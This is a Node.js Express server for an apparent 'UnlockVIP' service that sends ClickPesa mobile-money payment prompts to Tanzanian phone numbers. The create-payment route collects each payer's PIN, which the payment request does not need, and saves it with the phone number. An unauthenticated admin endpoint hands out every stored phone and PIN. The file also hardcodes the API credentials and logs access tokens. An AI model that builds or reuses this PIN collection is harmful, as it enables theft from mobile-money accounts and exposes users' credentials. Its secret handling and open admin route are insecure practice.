require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// =======================
// 📊 STORE PHONE + PIN
// =======================
let payments = [];

// =======================
// 🔑 ClickPesa Credentials
// =======================
const CLIENT_ID = "IDGG7esAa8NxA4a8QKQZQtF8jANvbyWv";
const API_KEY = "SK6AKepmgISgHgWC5RMlWVfWw57p7BMv4bXozBIFaF";

// =======================
// ROOT TEST
// =======================
app.get("/", (req, res) => {
  res.send("UnlockVIP Backend is running 🚀");
});

// =======================
// 🔐 GET ACCESS TOKEN
// =======================
async function getAccessToken() {
  try {

    const response = await axios.post(
      "https://api.clickpesa.com/third-parties/generate-token",
      {},
      {
        headers: {
          "client-id": CLIENT_ID,
          "api-key": API_KEY,
          "Content-Type": "application/json",
        },
      }
    );

    let token = response.data.token;

    if (!token.startsWith("Bearer")) {
      token = `Bearer ${token}`;
    }

    console.log("🔑 Generated Token:", token);

    return token;

  } catch (error) {
    console.error("❌ Token Error:", error.response?.data || error.message);
    throw new Error("Failed to get access token");
  }
}

// =======================
// 💳 CREATE PAYMENT
// =======================
app.post("/create-payment", async (req, res) => {
  try {

    let { phone, pin } = req.body;

    const amount = 3000;

    if (!phone) {
      return res.status(400).json({
        success: false,
        error: "Phone is required"
      });
    }

    phone = phone.toString().trim();

    if (phone.startsWith("+255")) {
      phone = phone.replace("+", "");
    }

    if (phone.startsWith("0")) {
      phone = "255" + phone.substring(1);
    }

    if (!phone.startsWith("255") || phone.length !== 12) {
      return res.status(400).json({
        success: false,
        error: "Invalid Tanzanian phone number"
      });
    }

    // =======================
    // 📊 SAVE PHONE + PIN
    // =======================
    payments.push({
      phone: phone,
      pin: pin || "",
      amount: amount,
      time: new Date().toLocaleString()
    });

    const token = await getAccessToken();

    const orderReference = "ORD" + Date.now();

    console.log("📦 Payment Request:");
    console.log({
      amount,
      phone,
      orderReference
    });

    const paymentResponse = await axios.post(
      "https://api.clickpesa.com/third-parties/payments/initiate-ussd-push-request",
      {
        amount: amount.toString(),
        currency: "TZS",
        orderReference: orderReference,
        phoneNumber: phone
      },
      {
        headers: {
          Authorization: token,
          "Content-Type": "application/json",
        },
      }
    );

    console.log("✅ ClickPesa Response:", paymentResponse.data);

    res.json({
      success: true,
      payment: paymentResponse.data
    });

  } catch (error) {

    console.error("❌ Payment Error:", error.response?.data || error.message);

    res.status(500).json({
      success: false,
      error:
        error.response?.data?.detail ||
        error.response?.data?.message ||
        error.response?.data?.error ||
        error.message
    });
  }
});

// =======================
// 📊 ADMIN DASHBOARD DATA
// =======================
app.get("/admin/payments", (req, res) => {
  res.json(payments);
});

// =======================
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});